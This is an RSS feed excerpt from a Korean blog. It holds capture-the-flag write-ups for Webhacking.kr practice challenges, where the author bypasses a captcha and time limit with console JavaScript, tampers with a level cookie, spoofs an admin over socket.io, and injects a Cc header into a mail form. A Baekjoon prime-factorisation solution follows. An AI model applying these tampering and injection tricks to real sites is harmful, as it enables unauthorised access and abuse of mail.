-      <pubDate>Wed, 12 May 2021 14:34:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-20"><a href="#Old-20" class="headerlink" title="Old - 20"></a>Old - 20</h2><p><img src="/images/pasted-357.png"><br>페이지를 확인하니, 입력 폼과 맨 위 가운데에 나타난 time limit가 눈에 띄었다.</p><p>대충 감으로 생각했을 때 2초 안으로 입력하라는 미션같다.</p><p><img src="/images/pasted-358.png"><br>시간 제한을 신경 안쓰고, 서버에 값을 보내니 Too Slow 문구가 출력되고 몇 초 지나서 원래의 페이지로 돌아갔다.</p><p>나는 자바스크립트를 이용하여 입력값을 넣고, 서버에 전송하여 2초를 넘기지 않고 서버로 값을 보내기 위해서는 코드를 작성하여 보내는 방법 밖에 없을거라 생각하여 코드를 작성하기 위해 개발자 도구로 페이지 코드를 확인하였다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ck</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">lv5frm.id.value==<span class="string">&quot;&quot;</span></span>)</span> &#123; lv5frm.id.focus(); <span class="keyword">return</span>; &#125;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">lv5frm.cmt.value==<span class="string">&quot;&quot;</span></span>)</span> &#123; lv5frm.cmt.focus(); <span class="keyword">return</span>; &#125;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">lv5frm.captcha.value==<span class="string">&quot;&quot;</span></span>)</span> &#123; lv5frm.captcha.focus(); <span class="keyword">return</span>; &#125;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">lv5frm.captcha.value!=lv5frm.captcha_.value</span>)</span> &#123; lv5frm.captcha.focus(); <span class="keyword">return</span>; &#125;</span><br><span class="line">  lv5frm.submit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>문제의 출제가 아주 보기 좋게 각 Input의 ID로 Input의 값을 검사하는 코드가 있어서 이것을 보고 간단하게 코드를 작성하였다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lv5frm.id.value = <span class="string">&quot;test&quot;</span></span><br><span class="line">lv5frm.cmt.value = <span class="string">&quot;test&quot;</span></span><br><span class="line">lv5frm.captcha.value = lv5frm.captcha_.value</span><br><span class="line">lv5frm.submit()</span><br></pre></td></tr></table></figure><p>개발자 도구의 콘솔을 열린 채로 페이지를 재로딩하여 페이지가 뜨자마자 저 코드들을 붙여넣기하여 실행하였다.</p><p><img src="/images/pasted-359.png"><br>그 결과 Flag를 획득 할 수 있었다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
-      
-      
-      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-20-Write-Up/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>Webhacking.kr Old - 1 Write Up</title>
-      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-1-Write-Up/</link>
-      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-1-Write-Up/</guid>
-      <pubDate>Wed, 12 May 2021 14:32:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-1"><a href="#Old-1" class="headerlink" title="Old - 1"></a>Old - 1</h2><p><img src="/images/pasted-354.png"><br>들어가면, Level 1이라는 글과 소스코드를 볼 수 있는 링크가 페이지에 출력되어 있다.</p><p>페이지에 아무 반응이 없어서 코드를 살펴보았다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;../../config.php&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>($_GET[<span class="string">&#x27;view-source&#x27;</span>] == <span class="number">1</span>)&#123; view_source(); &#125;</span><br><span class="line">  <span class="keyword">if</span>(!$_COOKIE[<span class="string">&#x27;user_lv&#x27;</span>])&#123;</span><br><span class="line">    SetCookie(<span class="string">&quot;user_lv&quot;</span>,<span class="string">&quot;1&quot;</span>,time()+<span class="number">86400</span>*<span class="number">30</span>,<span class="string">&quot;/challenge/web-01/&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;meta http-equiv=refresh content=0&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>맨 처음에 정의된 코드인데, user_lv이라는 쿠키를 1로 지정한다는 코드였다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(!is_numeric($_COOKIE[<span class="string">&#x27;user_lv&#x27;</span>])) $_COOKIE[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;user_lv&#x27;</span>]&gt;=<span class="number">4</span>) $_COOKIE[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;user_lv&#x27;</span>]&gt;<span class="number">3</span>) solve(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;level : <span class="subst">&#123;$_COOKIE[&#x27;user_lv&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>쿠키를 지정한 후 쿠키의 값을 검사하는데, 조건이  <code>3 &lt; user_lv =&lt; 4</code>이라는 조건에 해당하면 flag를 획득할 수 있다는 것이였다.</p><p><img src="/images/pasted-355.png"><br>이를 토대로 난 쿠키의 값을 3.1로 지정하여 페이지를 다시 불려왔다.</p><p><img src="/images/pasted-356.png"><br>flag를 획득할 수 있었다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
-      
-      
-      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-1-Write-Up/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>Webhacking.kr Old - 58 Write Up</title>
-      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-58-Write-Up/</link>
-      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-58-Write-Up/</guid>
-      <pubDate>Wed, 12 May 2021 14:29:53 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-58"><a href="#Old-58" class="headerlink" title="Old - 58"></a>Old - 58</h2><p><img src="/images/pasted-349.png"><br>이번엔 채팅앱 같은 페이지가 나왔다.</p><p><img src="/images/pasted-350.png"><br>aaaa를 입력하니, command not found라는 문구가 출력이 되었다.<br><br>command라는 단어를 보는 순간 난 ls 명령어를 입력하여 서버로 보냈다.</p><p><img src="/images/pasted-351.png"><br>파일 이름이 출력되었다. 다른 명령어들을 입력해보았지만, 모두 command not found라는 문구가 출력이 되었다.<br><br>그러다가 flag을 입력해보니, 다른 문구가 출력이 되었다.</p><p><img src="/images/pasted-352.png"><br>admin만 사용이 가능하다는 문구였다.<br><br>더이상 찾을 것이 없을 거 같아서 개발자 도구를 통해 코드를 살펴보았다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> username = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> socket = io();</span><br><span class="line">  $(<span class="string">&#x27;form&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">    socket.emit(<span class="string">&#x27;cmd&#x27;</span>,username+<span class="string">&quot;:&quot;</span>+$(<span class="string">&#x27;#m&#x27;</span>).val());</span><br><span class="line">    $(<span class="string">&#x27;#m&#x27;</span>).val(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">  socket.on(<span class="string">&#x27;cmd&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">    $(<span class="string">&#x27;#messages&#x27;</span>).append($(<span class="string">&#x27;&lt;li&gt;&#x27;</span>).text(msg));</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;); </span><br></pre></td></tr></table></figure><p>소켓 통신을 하는 스크립트가 있었다.</p><p>emit 함수는 서버로 데이터를 보내는 함수이고, on 함수는 서버에서 데이터를 받는 함수였다.<br><br>서버로 보내는 값을 보니, <code>guest:input에 입력한 값</code>을 보내고 있었다.</p><p>나는 이를 <code>admin:flag</code>로 변경하여 서버에 보내서 flag를 획득할 계획을 생각하였다.<br><br>개발자 도구의 콘솔로 admin으로 flag를 요청하였다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> socket = io();</span><br><span class="line">socket.emit(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&quot;admin:flag&quot;</span>);</span><br><span class="line">socket.on(</span><br><span class="line"><span class="string">&#x27;cmd&#x27;</span>, </span><br><span class="line">(msg) =&gt; $(<span class="string">&#x27;#messages&#x27;</span>).append( $(<span class="string">&#x27;&lt;li&gt;&#x27;</span>).text(msg) )</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-353.png"><br>그 결과 flag를 획득할 수 있었다.</p>]]></content:encoded>
-      
-      
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-58-Write-Up/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>Webhacking.kr Old - 47 Write Up</title>
-      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-47-Write-Up/</link>
-      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-47-Write-Up/</guid>
-      <pubDate>Wed, 12 May 2021 14:28:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-47"><a href="#Old-47" class="headerlink" title="Old - 47"></a>Old - 47</h2><p><img src="/images/pasted-345.png"><br>Mail subject라고 라벨이 있는 것으로 보아서, 메일을 보낸다는 것을 추측했다.</p><p><img src="/images/pasted-346.png"><br>Input에 기본값으로 지정된 값을 그대로 서버로 보내니,  메일을 보냈다는 문구가 출력되었다.</p><p>문제를 보고 난 BeeBox의 SMTP 문제를 생각할 수 있었다.<br><br>Input에 Cc을 넣어서 메일을 공격자가 원하는 메일로 참조하는 공격이였다.</p><p>위 방법대로 공격해보도록 하겠다.</p><p><img src="/images/pasted-347.png"><br>Post 메소드로 값을 넘겨주기 때문에 body 안에 Cc를  삽입하여 보냈다.</p><p><img src="/images/pasted-348.png"><br>그 결과 Flag를 획득할 수 있었다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
-      
-      
-      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-47-Write-Up/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>백준 실버 11653번 문제</title>
-      <link>https://lrtk-coder.github.io/2021/05/11/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-11653%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
-      <guid>https://lrtk-coder.github.io/2021/05/11/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-11653%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
-      <pubDate>Tue, 11 May 2021 10:44:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;소인수분해&quot;&gt;&lt;a href=&quot;#소인수분해&quot; class=&quot;headerlink&quot; title=&quot;소인수분해&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.acmicpc.net/problem/11653&quot;&gt;소인수분해&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;정수 N이 </description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="소인수분해"><a href="#소인수분해" class="headerlink" title="소인수분해"></a><a href="https://www.acmicpc.net/problem/11653">소인수분해</a></h1><p>정수 N이 주어졌을 때, 소인수분해하는 프로그램을 작성하시오.</p><h2 id="문제-풀이-1"><a href="#문제-풀이-1" class="headerlink" title="문제 풀이 - 1"></a>문제 풀이 - 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> n != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            print(i)</span><br><span class="line">            n = n//i</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="풀이-설명"><a href="#풀이-설명" class="headerlink" title="풀이 설명"></a>풀이 설명</h3><p>풀긴 했으나, 성능이 너무 안 좋아서, 좀 더 효율적으로 변경을 해야한다.</p><p>현재 이 코드의 시간 복잡도는 O(n^2)이다.<br><br>이 때문에 체점 시간이 1060ms이라는 엄청난 결과를 얻을 수 있었다.</p><h2 id="문제-풀이-2"><a href="#문제-풀이-2" class="headerlink" title="문제 풀이 - 2"></a>문제 풀이 - 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">i = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> n != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">        n = n//i</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="풀이-설명-1"><a href="#풀이-설명-1" class="headerlink" title="풀이 설명"></a>풀이 설명</h3><p>O(n)으로 변경하여 체점하였지만, 오히려 시간이 증가하였다…<br><br>수학에 기초가 부족한 나에겐 하루종일 걸릴거 같아서 다른 사람의 풀이를 참고하였다.</p><h2 id="문제-풀이-3"><a href="#문제-풀이-3" class="headerlink" title="문제 풀이 - 3"></a>문제 풀이 - 3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">r = <span class="built_in">int</span>(n ** <span class="number">0.5</span>)</span><br><span class="line">i = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= r:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> n % i:</span><br><span class="line">        n //= i</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> n &gt; <span class="number">1</span>:</span><br><span class="line">    print(n)</span><br></pre></td></tr></table></figure><h3 id="풀이-설명-2"><a href="#풀이-설명-2" class="headerlink" title="풀이 설명"></a>풀이 설명</h3><p>다른 분들은 루트의 근사값을 이용하여 반복 횟수를 줄임으로써 시간을 절약하였다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EC%8B%A4%EB%B2%84/">실버</category>
-      
-      
-      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
-      
-      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%844/">백준 실버4</category>
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/05/11/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-11653%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
       
     </item>
     
